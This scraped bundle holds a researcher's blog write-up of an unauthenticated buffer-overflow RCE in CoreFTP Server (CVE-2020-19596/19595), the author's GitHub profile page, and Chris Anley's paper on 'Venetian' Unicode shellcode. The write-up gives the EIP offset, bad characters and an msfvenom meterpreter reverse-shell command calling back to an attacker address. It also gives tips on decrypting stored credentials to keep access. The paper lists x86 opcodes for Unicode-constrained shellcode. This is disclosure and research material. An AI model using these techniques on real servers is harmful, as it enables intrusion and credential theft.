=== Content from www.0x90.zone_a9fe215d_20250119_123111.html ===

[0x90](/)

[About](/about/)

# Unauthenticated Remote Code Execution/DoS on CoreFTP Server - CVE-2020-19596/CVE-2020-19595

Aug 16, 2020

# Unauthenticated Remote Code Execution/DoS on CoreFTP Server - CVE-2020-19596/CVE-2020-19595

Well hello there, hope everyone is doing well on this lockdown. As with many people, I start learning some new tricks, and I went old school on this one. Due to the excess time, we had to play with another thing I started looking again for old school exploits such as Buffer Overflows. Well, it didn‚Äôt take long to find one.

CoreFTP comes in two versions: a client and a Server. Let us focus on the server-side. CoreFTP Server is an FTP Server (shocking) that allows IT administrators not only to serve as FTP but as SFTP with client certificates and integrate with the domain. For the sake of clarity, we tested the Core FTP build 583.

## Starting testing

As with every test, we start by sending some erroneous data to every user input field possible. There were a lot of crashes in the Server Management GUI. For instance, on the self-signed server certificate fields, we could overwrite the EIP pretty quickly, but the problem would be non-ASCII characters, and it would be dumb since you there already have access to the management interface that supposedly operates in Administrative mode since the server needs to bind to lower ports (0-1023).

However, this opens the door to exploit other fields. The server exposes a network port to allow clients to connect and retrieve data. I choose to go with the SFTP (Basically SSH only with file support) with SSH keys enabled. The first idea was to try to send garbage data in the Key-Exchange phase of the protocol, for instance, send an overly long encoded communication to trigger the exploit. However, the clients try to verify if the data is valid before sending. Next, I just tried the simple username with ‚ÄòA ‚Äò\*huge\_amount and the server stopped responding and hanged. Hmmm..

![crashServer](https://www.0x90.zone/images/coreftprce/image4.png)

I quickly created an environment with the service running on a Windows XP SP3 Build 2600 (because, no protections) and another on a Windows 10 machine. For the sake of clarity, **my victim machine will be at 192.168.155.132**, and the **attackers‚Äô machine will be at 192.168.155.176**. I quickly checked the binary and verified that it doesn‚Äôt have any security extensions; this means no ASLR no DEP, nothing. Thus we don‚Äôt need to worry about bypassing these technologies. I follow the training in [here](https://www.fuzzysecurity.com/tutorials.html) (and I recommend it). I attached a debugger (ImmunityDBG) to the process and generated an SSH key pair (it doesn‚Äôt matter as we are going to find out) and use it to connect to the server but with the ‚ÄòA‚Äô\*1024 as the username and we get the glorious EIP 41414141. Hurray! We control the EIP and have a primary entry point to try to exploit this!

![debuggerattached](https://www.0x90.zone/images/coreftprce/image5.png)

## Exploiting it (CVE-2020-19596)

If you read the tutorial link (and I think you should if it‚Äôs the first time you reading something like this), you should know that the next step is to determine the offset to rewrite the EIP. You can either do it by trial and error or be intelligent and use something like the pattern generator tool from the Metasploit framework. With that, we can see that the EIP will be overwritten after `198 bytes`, which means that we need to write 198 bytes before rewriting it.

![monafindoffset](https://www.0x90.zone/images/coreftprce/image1.png)

After that, find any instruction capable of jumping to our shellcode, such as a `call ESP`. We can use the [mona script](https://github.com/corelan/mona) to help enumerate all the possibilities to do this. It will search for all compatible instructions in all the code and imported functions. Since the main code contains a NULL byte, we can not choose it, so we need to rely on imported DLLs. Since Windows XP have a lot of them without ALSR, we can pick one that suits us. However, it means that the exploit needs to be ported for other operating systems, service packs, maybe language, etc.

![monajumptoshellcode](https://www.0x90.zone/images/coreftprce/image6.png)

In the previous image, we can see some of the possible `JUMP ESP` instructions, but there are a lot more on them in a text file on your workspace:

![monajumptoshellcode2](https://www.0x90.zone/images/coreftprce/image7.png)

Next, we should move along and perform a bad chars evaluation. When we send the characters to the buffer, some of them may break the normal functioning of the exploit (due to verifications or operations on them). We can use the mona script to generate an array of all possible values, from 0x00 to 0xFF or from 0 to 255. Sending this buffer and analyzing the memory afterwards gets us the bad chars. Mona script can help compare the chars and the bad chars and provide a direct response on what we should exclude of the payload.

![monadetectbadchars](https://www.0x90.zone/images/coreftprce/image8.png)

The payload can then be crafted using the Metasploit Venom and passing the bad chars (`\x00 \x01 \x02 \x0a \x0d \x40`) with the ‚Äò-b‚Äô flag. We generate a small payload to get remote code execution:

`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.155.176 LPORT=443 -b '\x00\x01\x02\x0a\x0d\x40' -f python --smallest`

In this case, I used a meterpreter payload just because but you can choose whatever you want. I just opened a listener on Metasploit console and ran the following exploit.

![exploitcode](https://www.0x90.zone/images/coreftprce/image9.png)

Yes, I pasted an image with the code because it could trigger Antivirus Agents since it has a very rudimentary Meterpreter shell in it. The exploit uses the paramiko [paramiko SSH library](http://www.paramiko.org/) to connect to the SSH service and pass the payload as the username. The connection will fail, but at that point, we should get our shell in Metasploit. One small detail, if we use the `CALL ESP`, the exploit will succeed, and the service will continue to run as intended, at least on this case. Hurray, we got unauthenticated RCE! =). Some additional remarks are in order: Once you get RCE and can access the file system, try to access the configuration file. There you will find several hashes encrypted with AES256, someone did a great reversing job and posted the procedure to decrypt them [here](https://coreysalzano.com/how-to/how-to-extract-passwords-from-core-ftp-le/). You can also look for specific memory locations of the decrypted hashes (I sure did but later found out this, at least I learn something in the process). Then you can use that credential hopefully to maintain access. The application needs to run on Administrator mode, so you just got at least Local Administrative on a machine, congratz!

![exploitcode](https://www.0x90.zone/images/coreftprce/image10.png)

There are also other versions vulnerable to this, but after version 2.1 of the CoreFTP Server, the buffer started converting to UTF-8, and we need to perform [Venetian method](https://img2.helpnetsecurity.com/dl/articles/unicodebo.pdf) to exploit it. I was not successful in doing that, so the last that we can achieve is Denial of Service (DoS, CVE-2020-19595). To do this, we send garbage to the buffer and crash the service. Meh, not that good but could be helpful in some situations. Maybe someone that knows more than what I do can help and exploit this.

There is the problem of portability of the exploit. I did this on a Windows XP SP3 machine (except the detection of security extensions, that I did on the Windows 10 Machine) so I won‚Äôt be bothered with ASLR and DEP modes. Since the code of the program holds bad chars, such as the NULL byte (0x00) we can‚Äôt use it to steal an instruction to jump to our shellcode. Otherwise, the exploit would work on all OSs. Therefore we needed to use some of the imported DLLs present to reuse the instruction, and then jump to our shellcode. One interesting thing to work on is to try to craft something that would bypass the authentication, jump the verification of the password and give access to files. Don‚Äôt know if it is possible but I wonder. Also, this exploit **only works if the SSH key is enabled**. You don‚Äôt need a user registered with it, but the server should accept it. The problem relies on the most robust configuration (using SSH keys to authenticate users) even if there is none configured.

## Disclosure

This vulnerability follows the responsible disclosure standard. At first, the vendor did not reply but after insisting I got trough to someone who could patch this. After investigation, he provided the patch to clients, and after the patch is available for one month, I released this disclosure. I like to thank them for providing support for fixing this vulnerability. As a footnote, I am still waiting for the CVE ID from Mitre, when that‚Äôs available, I‚Äôll update this page.

## Timeline

* 01/05/2020 - Vulnerability discovery
* 02/06/2020 - First contact with vendor
* 21/06/2020 - Second contact with vendor
* 26/06/2020 - Vulnerability fix tested, patch confirmed
* 27/07/2020 - Official date of release
* 16/08/2020 - Real date of release
* 23/08/2020 - Grammer fixes, thanks to @jpdias =)
* 04/04/2020 - Added CVE-2020-19596 and CVE-2020-19595

## 0x90

* 0x90
* [[email¬†protected]](/cdn-cgi/l/email-protection#b7c7d2d3c5d8c4d8c2c4d6c5d8d3c5ded0c2d2c4f7c7c5d8c3d8d9dad6dedb99d4d8da)

* [psrodrigues](https://github.com/psrodrigues)
* [Pedro\_SEC\_R](https://twitter.com/Pedro_SEC_R)

"0x90" Zone (or NoOperation Zone). There is actually nothing to see here. This website is for my personal infosec research. Opinions are mine only. It's a blog, you can find some articles about what I get in the field. Constructive comments are welcome. Have fun, stay safe.



=== Content from github.com_d85fd043_20250119_140911.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpsrodrigues)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpsrodrigues)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@psrodrigues](https://avatars.githubusercontent.com/u/22836637?s=64&v=4)

**psrodrigues**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fpsrodrigues)

[Overview](/psrodrigues)
[Repositories
6](/psrodrigues?tab=repositories)
[Projects
0](/psrodrigues?tab=projects)
[Packages
0](/psrodrigues?tab=packages)
[Stars
2](/psrodrigues?tab=stars)

More

* [Overview](/psrodrigues)
* [Repositories](/psrodrigues?tab=repositories)
* [Projects](/psrodrigues?tab=projects)
* [Packages](/psrodrigues?tab=packages)
* [Stars](/psrodrigues?tab=stars)

![@psrodrigues](https://avatars.githubusercontent.com/u/22836637?s=64&v=4)

**psrodrigues**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fpsrodrigues)

[![View psrodrigues's full-sized avatar](https://avatars.githubusercontent.com/u/22836637?v=4)](https://avatars.githubusercontent.com/u/22836637?v=4)
üí≠

I may be slow to respond.

# Pedro Daniel Carvalho de Sousa Rodrigues psrodrigues

üí≠

I may be slow to respond.

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fpsrodrigues)

[9
followers](https://github.com/psrodrigues?tab=followers) ¬∑ [0
following](https://github.com/psrodrigues?tab=following)

* [0x90.zone](http://0x90.zone)

## [Achievements](/psrodrigues?tab=achievements)

[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/psrodrigues?achievement=pull-shark&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/psrodrigues?achievement=arctic-code-vault-contributor&tab=achievements)
## [Achievements](/psrodrigues?tab=achievements)

[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)](/psrodrigues?achievement=pull-shark&tab=achievements)[![Achievement: Arctic Code Vault Contributor](https://github.githubassets.com/assets/arctic-code-vault-contributor-default-df8d74122a06.png)](/psrodrigues?achievement=arctic-code-vault-contributor&tab=achievements)
## Highlights

* Pro

Block or Report

# Block or report psrodrigues

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user‚Äôs behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=psrodrigues+%28user%29)

[Overview](/psrodrigues)
[Repositories
6](/psrodrigues?tab=repositories)
[Projects
0](/psrodrigues?tab=projects)
[Packages
0](/psrodrigues?tab=packages)
[Stars
2](/psrodrigues?tab=stars)

More

* [Overview](/psrodrigues)
* [Repositories](/psrodrigues?tab=repositories)
* [Projects](/psrodrigues?tab=projects)
* [Packages](/psrodrigues?tab=packages)
* [Stars](/psrodrigues?tab=stars)

## Popular repositories Loading

1. [anvizpwn](/psrodrigues/anvizpwn) anvizpwn
   Public

   This project aims to test the security of Anviz T&A products

   Python

   [3](/psrodrigues/anvizpwn/stargazers)
2. [hostapd\_pmkid](/psrodrigues/hostapd_pmkid) hostapd\_pmkid
   Public

   This repository aims to deliver a vulnerable Hostapd vulnerable to PMKID.

   C

   [1](/psrodrigues/hostapd_pmkid/stargazers)
3. [psrodrigues.github.io](/psrodrigues/psrodrigues.github.io) psrodrigues.github.io
   Public

   HTML
4. [qBittorrent](/psrodrigues/qBittorrent) qBittorrent
   Public

   Forked from [qbittorrent/qBittorrent](/qbittorrent/qBittorrent)

   qBittorrent BitTorrent client

   C++
5. [intelmq](/psrodrigues/intelmq) intelmq
   Public

   Forked from [certtools/intelmq](/certtools/intelmq)

   IntelMQ is a solution for IT security teams for collecting and processing security feeds using a message queuing protocol.

   Python
6. [PowerSploit](/psrodrigues/PowerSploit) PowerSploit
   Public

   Forked from [PowerShellMafia/PowerSploit](/PowerShellMafia/PowerSploit)

   PowerSploit - A PowerShell Post-Exploitation Framework

   PowerShell

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from img2.helpnetsecurity.com_a8c3a8e4_20250119_140910.html ===
An NGSSoftware Insight Security Research (NISR) Publication

Creating Arbitrary Shellcode In Unicode
Expanded Strings

The ‚ÄúVenetian‚Äù exploit

Chris Anley (chris@nextgenss.com)
8th January 2002

www.ngssoftware.com

[Abstract]

The paper is intended to be read by the
portion of the security community
responsible for creating protective
mechanisms to guard against
‚Äúshellcode‚Äù type security flaws; the
intention is to remove the perception
that Unicode buffer overflows are non
exploitable and thereby improve the
general state of network security. It is
often the case that several classes of
overflow or format string bug are
labelled ‚Äúdenial of service‚Äù attacks
when in fact it is possible to execute
arbitrary code. This paper deals with
one of these classes of overflow.

This paper introduces a technique (the
‚ÄúVenetian‚Äù exploit) that can be used to
permit the execution of a small amount
of arbitrary code in a situation where a
buffer overflow occurs in a ‚ÄúUnicode‚Äù
string on the Intel x86 processors. This
situation is common in the Windows
operating systems but the technique is
not operating system specific.

[Introduction]

It is often the case that an overflow on
the Windows platform occurs in a
string that is converted to Unicode
prior to the overflow.

This leads to a complication when
attempting to write an ‚Äúexploit‚Äù, since
the shellcode will generally have null
bytes inserted between each byte of
the submitted string. For example

AAAA

...becomes

00 41 00 41 00 41 00 41

It is generally acknowledged that
writing meaningful shellcode in which

every alternate byte is zero is
extremely hard. This paper describes
how this problem can be overcome,
using a technique not dissimilar to the
‚Äúbridge building‚Äù method that can be
used to create exploit code using only
printable ASCII characters.

[Assumptions]

In order for this technique to be useful,
a number of conditions must hold:

1)  It must be possible to redirect

the execution path of the target
program into the Unicode
buffer.

And either:

2)  One of the registers

eax,ebx,ecx,edx,esp,ebp or esi
points to a known offset in our
Unicode buffer

Or‚Ä¶

3)  We know, or can easily obtain,
the absolute address in memory
of our buffer

[The ‚ÄúVenetian‚Äù Exploit]

The Unicode buffer can be imagined to
be somewhat similar to a Venetian
blind; there are ‚Äúsolid‚Äù bytes that we
control, and ‚Äúgaps‚Äù containing the
alternating zeroes.

The technique described below
consists of using the ‚Äúsolid‚Äù bytes at
the start of the buffer to interleave
chosen bytes into the gaps further
down in the buffer, effectively
‚Äúclosing‚Äù the blind, and creating a
small amount of totally arbitrary
shellcode that is the actual payload of
the exploit.

In order to do this, we must come up
with some way of modifying memory
using instructions that contain
alternating zeroes.

Instructions on the Intel processors
have variable length. Since every
other byte of our code must be zero,
we will have to insert ‚Äúnop‚Äù equivalent
instructions (instructions that do
nothing of consequence to our code,
but which act as ‚Äúfiller‚Äù) in order to
make sure that our code is aligned
correctly on instruction boundaries.

Generally we will be using instructions
that start with a non-zero byte, since
the instructions that start with 00 are
all ‚Äúadd‚Äù, which is not especially
useful to us.

Hence, if the next instruction in our
code must start with a 00, we can
use instructions of the following form
to ‚Äúrealign‚Äù so that we can do
something more interesting with
subsequent instructions:

00 6D 00:add byte ptr [ebp],ch

This assumes that ebp points to
something that is writeable, and that
we don't care about for the purposes of
the ‚Äúexploit‚Äù. If this is not the case, we
can use one of the following:

00 6E 00:add byte ptr [esi],ch
00 6F 00:add byte ptr [edi],ch
00 70 00:add byte ptr [eax],dh
00 71 00:add byte ptr [ecx],dh
00 72 00:add byte ptr [edx],dh
00 73 00:add byte ptr [ebx],dh

If none of the registers points to a
location that we can safely overwrite,
we just assign a constant pointer value
to (say) eax using these instructions:

6A 00:push 0
58   :pop         eax

(to assign ‚Äú0‚Äù to eax), then we ‚Äúadd‚Äù
and ‚Äúsub‚Äù as described below, until eax
points to a location in memory that we
can safely overwrite with our ‚Äúnop‚Äù
equivalent alignment instructions. This
gives us a convenient way of
‚Äòrealigning‚Äô our instructions.

As stated above, we assume that there
is a register that points to our Unicode
buffer.

What we are going to do is ‚Äúset‚Äù every
00 byte beyond a certain point in our
buffer to the value of our choice, by
doing this:

80 00 75:add byte ptr [eax],75h

...then incrementing eax twice...

40:inc eax
00 6D 00:add byte ptr [ebp],ch
40:inc eax

Then setting the next 00 byte. This will
end up with arbitrary bytes being
placed in a part of the buffer towards
the end of our shellcode. The buffer
will be laid out like this:

0x00000000
...
[ alternate-zero byte setting code ]
[ arbitrary bytes of shellcode ]
...
0xffffffff

Of course, the first thing we have to do
is get a pointer to the part of the buffer
where we intend to start writing
arbitrary bytes.

To do this, we exchange the values of
the register that points to our shellcode
with (say) eax, using the convenient
one-byte ‚Äúxchg‚Äù instruction - one of
the following:

93:xchg eax,ebx
91:xchg eax,ecx
92:xchg eax,edx

94:xchg eax,esp
95:xchg eax,ebp
96:xchg eax,esi
97:xchg eax,edi

We then modify the value of eax using
‚Äúadd‚Äù and ‚Äúsub‚Äù, to make it point to
the ‚Äúarbitrary byte‚Äù part of our buffer:

05 00 75 00 4C:
   add eax,4C007500h

2D 00 75 00 4C:
   sub eax,4C007500h

Multiple ‚Äúadd‚Äù and ‚Äúsub‚Äù operations
will probably be necessary. We can
easily add multiples of 256 by going
like this:

add eax,4C007500h
sub eax,4C007400h

We then start adding and incrementing
as described above.

Our arbitrary code gets executed due to
the fact that we just execute through
our ‚Äúbyte setting‚Äù code and into the
arbitrary code. If we get that initial
pointer offset right, we will just
continue executing into our arbitrary
code.

[Problems]

First; if the target program has a high
bit filter, this technique is very hard,
because it is probably necessary to do
the initial pointer ‚Äúxchg‚Äù, and that
requires an opcode above 0x7f. This is
likely to create difficulty, although a
series of ‚Äòpush‚Äô and ‚Äòpop‚Äô instructions
could be made to be equivalent.

Size is also an issue - the instruction
sequence to set a single 00 byte looks
like this:

40      :inc eax
00 6D 00:add byte ptr [ebp],ch
40      :inc eax
00 6D 00:add byte ptr [ebp],ch

80 00 75:add byte ptr [eax],75h
00 6D 00:add byte ptr [ebp],ch

... so that's 14 bytes of code to set 2
arbitrary bytes (we get one for free,
remember; the one that was already in
the string).

That means assuming a buffer of 1024
bytes that we can set, the maximum
size of the exploit code will be

(1024 * 2) / 14 = 146 bytes (since the
size of a Unicode string doubles)

Which isn't much, but it is enough to
do some harm; run an arbitrary
command, for example.

It is probable that refinements to the
technique are possible that reduce the
amount of code necessary to create the
arbitrary shellcode.

To put this in context, code that will
initiate a reverse shell fits into less than
170 bytes. This technique will
therefore probably be sufficient to
successfully exploit a Unicode
overflow in the ‚Äúwild‚Äù.

[Conclusion]

The ‚ÄúVenetian‚Äù exploit technique
described in this paper is a somewhat
convoluted way of writing an exploit
but it handles a situation that is quite
commonly seen in the Windows family
of operating systems.

Hopefully this paper has demonstrated
that treating Unicode ‚Äì based
overflows as non-exploitable is
dangerous.

It is always safest to assume that if the
execution path of a program can be
affected in any way, that it is possible
to execute arbitrary code.


